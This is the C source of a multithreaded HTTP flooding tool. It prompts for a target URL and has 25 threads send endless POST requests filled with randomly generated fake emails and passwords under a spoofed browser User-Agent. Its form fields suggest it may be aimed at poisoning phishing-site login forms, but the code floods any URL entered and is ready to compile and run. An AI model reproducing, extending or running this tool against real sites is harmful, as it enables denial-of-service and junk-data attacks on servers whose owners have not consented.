#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <curl/curl.h>
#include <time.h>
#include <unistd.h>
#include <ctype.h>

#define NUM_THREADS 25

typedef struct {
    char *domain;
    int weight;
} WeightedEmailDomain;

WeightedEmailDomain weighted_email_domains[] = {
    {"@example.com", 50},
    {"@sample.com", 30},
    {"@test.com", 20}
};

int num_email_domains = sizeof(weighted_email_domains) / sizeof(weighted_email_domains[0]);

void generate_random_string(char *str, size_t length, const char *charset) {
    size_t charset_size = strlen(charset);
    for (size_t i = 0; i < length; i++) {
        str[i] = charset[rand() % charset_size];
    }
    str[length] = '\0';
}

void name_gen(char *name) {
    const char *first_names[] = {"John", "Jane", "Alice", "Bob"};
    const char *last_names[] = {"Doe", "Smith", "Johnson", "Williams"};

    int first_name_index = rand() % 4;
    int last_name_index = rand() % 4;

    const char *first_name = first_names[first_name_index];
    const char *last_name = last_names[last_name_index];

    int name_system = rand() % 3;
    switch (name_system) {
        case 0:
            sprintf(name, "%s%s", first_name, last_name);
            break;
        case 1:
            sprintf(name, "%s%c", first_name, last_name[0]);
            break;
        case 2:
            sprintf(name, "%c%s", first_name[0], last_name);
            break;
    }
}

void generate_random_email(char *email) {
    char name[50];
    name_gen(name);

    int use_number = rand() % 2;

    int total_weight = 0;
    for (int i = 0; i < num_email_domains; i++) {
        total_weight += weighted_email_domains[i].weight;
    }

    int random_number = rand() % total_weight;
    int cumulative_weight = 0;
    char *selected_domain = NULL;
    for (int i = 0; i < num_email_domains; i++) {
        cumulative_weight += weighted_email_domains[i].weight;
        if (random_number < cumulative_weight) {
            selected_domain = weighted_email_domains[i].domain;
            break;
        }
    }

    if (use_number) {
        sprintf(email, "%s%d%s", name, rand() % 100 + 1, selected_domain);
    } else {
        sprintf(email, "%s%s", name, selected_domain);
    }
}

void generate_random_password(char *password) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";
    int length = rand() % 9 + 12;
    generate_random_string(password, length, charset);
}

void *send_posts(void *url) {
    CURL *curl;
    CURLcode res;

    char email[100];
    char password[50];
    char post_data[200];
    char user_agent[200];

    curl = curl_easy_init();
    if(curl) {
        while(1) {
            generate_random_email(email);
            generate_random_password(password);
            sprintf(post_data, "a=%s&az=%s", email, password);
            sprintf(user_agent, "User-Agent: Mozilla/5.0");

            struct curl_slist *headers = NULL;
            headers = curl_slist_append(headers, user_agent);

            curl_easy_setopt(curl, CURLOPT_URL, (char *)url);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_NOBODY, 1L); // Only fetch the header

            res = curl_easy_perform(curl);
            if(res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            } else {
                long response_code;
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
                
                // Get current time
                time_t rawtime;
                struct tm * timeinfo;
                char buffer[80];

                time(&rawtime);
                timeinfo = localtime(&rawtime);

                strftime(buffer, 80, "%Y-%m-%d %H:%M:%S", timeinfo);
                printf("%s - Status Code: %ld\n", buffer, response_code);
            }

            curl_slist_free_all(headers);
            sleep(rand() % 5 + 1);
        }
        curl_easy_cleanup(curl);
    }

    return NULL;
}

int main() {
    srand(time(NULL));
    curl_global_init(CURL_GLOBAL_DEFAULT);

    char url[256];
    printf("Enter the URL of the target you want to flood: ");
    scanf("%s", url);

    pthread_t threads[NUM_THREADS];
    for(int i = 0; i < NUM_THREADS; i++) {
        if(pthread_create(&threads[i], NULL, send_posts, (void *)url)) {
            fprintf(stderr, "Error creating thread\n");
            return 1;
        }
    }

    for(int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    curl_global_cleanup();
    return 0;
}
